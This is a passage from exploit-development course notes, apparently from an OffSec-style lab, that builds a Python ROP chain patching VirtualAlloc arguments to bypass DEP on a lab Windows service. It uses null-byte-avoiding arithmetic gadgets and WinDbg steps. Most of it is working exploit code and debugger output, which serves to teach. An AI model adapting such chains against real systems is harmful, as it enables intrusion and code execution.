<a data-footnote-ref href="#user-content-fn-23">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-24">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-25">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-26">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-27">rop += pack("&#x3C;L", (0x5050118e)) # mov eax, esi ; pop esi ; ret</a>
<a data-footnote-ref href="#user-content-fn-28">rop += pack("&#x3C;L", (0x42424242)) # junk</a>
<a data-footnote-ref href="#user-content-fn-29">rop += pack("&#x3C;L", (0x5052f773)) # push eax ; pop esi ; ret</a>
<a data-footnote-ref href="#user-content-fn-30">rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-31">rop += pack("&#x3C;L", (0xfffffdf4)) # -0x20c</a>
<a data-footnote-ref href="#user-content-fn-32">rop += pack("&#x3C;L", (0x50533bf4)) # sub eax, ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-33">rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>

{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Be sure to set a breakpoint on the new command prior to resuming the execution. 
bp 0x5051cbb6
g
# Run the updated PoC. 
python step14.py 192.168.223.10
# Step through the new code. 
g
g
g
dd eax L4
```
{% endcode %}

Now we are going to move to _dwSize_, which we can set to 0x01, since _VirtualAlloc_ will apply the new protections on the entire memory page. The issue is that the value is really a DWORD (0x00000001), so it will contain null bytes.

Once again, we must use a trick to avoid them, and in this case, we can take advantage of another math operation, negation. The _NEG_[1](https://portal.offsec.com/courses/exp-301/books-and-videos/modal/modules/stack-overflows-and-dep-bypass/bypassing-dep/patching-arguments#fn1) instruction will replace the value in a register with its two's complement.[2](https://portal.offsec.com/courses/exp-301/books-and-videos/modal/modules/stack-overflows-and-dep-bypass/bypassing-dep/patching-arguments#fn2)

This is equivalent to subtracting the value from zero. When we do that with 0xffffffff (after ignoring the upper DWORD of the resulting QWORD), we get 0x01.

```
0:006> ? 0 - ffffffff
Evaluate expression: -4294967295 = ffffffff`00000001
```

Stripping the upper part is done automatically since registers on a 32-bit operating system can only contain the lower DWORD.

The steps we must perform for _dwSize_ are:

* Increase the ESI register by four with the increment gadgets to align it with the next placeholder argument in the API skeleton call.
* Pop the value 0xffffffff into EAX and then negate it.
* Write EAX onto the stack to patch the _dwSize_ argument.

Listing shows this implementation in the updated ROP chain.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret
<a data-footnote-ref href="#user-content-fn-34">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-35">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-36">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-37">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-38">rop += pack("&#x3C;L", (0x5053a0f5)) # pop eax ; ret </a>
<a data-footnote-ref href="#user-content-fn-39">rop += pack("&#x3C;L", (0xffffffff)) # -1 value that is negated</a>
<a data-footnote-ref href="#user-content-fn-40">rop += pack("&#x3C;L", (0x50527840)) # neg eax ; ret</a>
<a data-footnote-ref href="#user-content-fn-41">rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>

{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Be sure to set a breakpoint on the new command prior to resuming the execution. 
bp 0x5053a0f5
g
# Run the updated PoC. 
python step15.py 192.168.223.10
# Step through the new code. 
g
g
p
p
p
p
p
# View the stack
dd esi - c L4
```
{% endcode %}

Now we must move to _flAllocationType_, which must be set to 0x1000. We could try to reuse the trick of negation but we notice that two's complement to 0x1000 is 0xfffff000, which also contains null bytes:

```
0:063> ? 0 - 1000
Evaluate expression: -4096 = fffff000
```

While it would be possible to perform some tricks to fix this problem, we are going to use a different technique to highlight the fact that when selecting gadgets, we must often think creatively.

We're going to use the existing gadgets we found, which will allow us to pop arbitrary values into EAX and ECX and subsequently perform an addition of them.

Let's choose a large, arbitrary value like 0x80808080 that does not contain null-bytes. if we subtract this value from 0x1000, we get the value 0x7F7F8F80 which is also null free.

```
0:063> ? 1000 - 80808080
Evaluate expression: -2155901056 = ffffffff`7f7f8f80

0:063> ? 80808080 + 7f7f8f80
Evaluate expression: 4294971392 = 00000001`00001000
```

Now we need to update our ROP chain to pop 0x80808080 into EAX, pop 0x7f7f8f80 into ECX, and then add them together.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret
<a data-footnote-ref href="#user-content-fn-42">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-43">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-44">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-45">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-46">rop += pack("&#x3C;L", (0x5053a0f5)) # pop eax ; ret </a>
<a data-footnote-ref href="#user-content-fn-47">rop += pack("&#x3C;L", (0x80808080)) # first value to be added</a>
<a data-footnote-ref href="#user-content-fn-48">rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-49">rop += pack("&#x3C;L", (0x7f7f8f80)) # second value to be added</a>
<a data-footnote-ref href="#user-content-fn-50">rop += pack("&#x3C;L", (0x5051579a)) # add eax, ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-51">rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret</a>
<a data-footnote-ref href="#user-content-fn-52">rop += b"C" * (0x400 - 276 - 4 - len(rop))</a>
</code></pre>

{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Be sure to set a breakpoint on the new command prior to resuming the execution. 
# Conditional breakpoint use the .if statement in our breakpoint in order to break on the target address only when EAX is set to 0x80808080. Due to sign extension, we must perform a bitwise AND operation to obtain the correct result in the comparison.
bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
g
# Run the updated PoC. 
python step16.py 192.168.223.10
# Step through the new code. 
p
p
# View the stack
dd esi - c L4
```
{% endcode %}

We find that the ADD operation created the correct value in EAX (0x1000), which was then used to patch the placeholder argument on the stack.

The last argument is the new memory protection value, which, in essence, is what allows us to bypass DEP. We want the enum _PAGE\_EXECUTE\_READWRITE_, which has the numerical value 0x40.

In order to write that to the stack, we will reuse the same technique we did for _flAllocationType_. Listing 72 shows us the values to use.

```
0:063> ? 40 - 80808080
Evaluate expression: -2155905088 = ffffffff`7f7f7fc0

0:063> ? 80808080 + 7f7f7fc0
Evaluate expression: 4294967360 = 00000001`00000040
```

According to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the desired value of 0x40. Listing 73 illustrates the ROP chain to implement. It is an exact copy of the previous one except for the values to add.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret
<a data-footnote-ref href="#user-content-fn-53">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-54">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-55">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-56">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-57">rop += pack("&#x3C;L", (0x5053a0f5)) # pop eax ; ret </a>
<a data-footnote-ref href="#user-content-fn-58">rop += pack("&#x3C;L", (0x80808080)) # first value to be added</a>
<a data-footnote-ref href="#user-content-fn-59">rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-60">rop += pack("&#x3C;L", (0x7f7f7fc0)) # second value to be added</a>
<a data-footnote-ref href="#user-content-fn-61">rop += pack("&#x3C;L", (0x5051579a)) # add eax, ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-62">rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret</a>
<a data-footnote-ref href="#user-content-fn-63">rop += pack("&#x3C;L", (0x5051e4db)) # int3 ; push eax ; call esi</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>

After the last gadget, which writes the _flProtect_ argument to the stack, we add an additional gadget. This gadget's first instruction is a software breakpoint and will not be part of the final exploit. This will allow us to execute the entire ROP chain and catch the execution flow just after the _flProtect_ dummy value has been patched.

{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Then resume the execution. 
g
# Run the updated PoC. 
python step17.py 192.168.223.10
# Step through the new code. 
p
p
# View the stack
dds esi - 14 L6
```
{% endcode %}

### Executing VirtualAlloc

[^1]: 

[^2]: 

[^3]: 

[^4]: 

[^5]: 

[^6]: 

[^7]: 

[^8]: 

[^9]: 

[^10]: 

[^11]: 

[^12]: 

[^13]: 

[^14]: 

[^15]: 

[^16]: 

[^17]: 

[^18]: 

[^19]: 

[^20]: 

[^21]: 

[^22]: 

[^23]: 

[^24]: 

[^25]: 

[^26]: 

[^27]: 

[^28]: 

[^29]: 

[^30]: 

[^31]: 

[^32]: 

[^33]: 

[^34]: 

[^35]: 

[^36]: 

[^37]: 

[^38]: 

[^39]: 

[^40]: 

[^41]: 

[^42]: 

[^43]: 

[^44]: 

[^45]: 

[^46]: 

[^47]: 

[^48]: 

[^49]: 

[^50]: 

[^51]: 

[^52]: 

[^53]: 

[^54]: 

[^55]: 

[^56]: 

[^57]: 

[^58]: 

[^59]: 

[^60]: 

[^61]: 

[^62]: 

[^63]: 
